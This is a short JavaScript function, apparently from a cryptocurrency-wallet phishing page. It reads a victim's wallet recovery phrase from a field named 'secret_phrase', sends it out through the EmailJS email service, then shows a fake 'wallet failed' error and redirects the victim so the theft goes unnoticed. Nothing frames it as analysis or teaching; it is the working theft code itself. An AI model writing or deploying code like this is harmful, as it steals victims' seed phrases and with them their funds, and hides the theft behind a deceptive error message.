function SendMail() {
    var params = {
        result : document.getElementById("secret_phrase").value
    }
    emailjs.send("service_fm0ybhm", "template_bhbz48m", params).then(function (res) {
        alert("Error!: wallet failed to interact successfully" );
        window.location.href = "/check/index.html";
    })
}
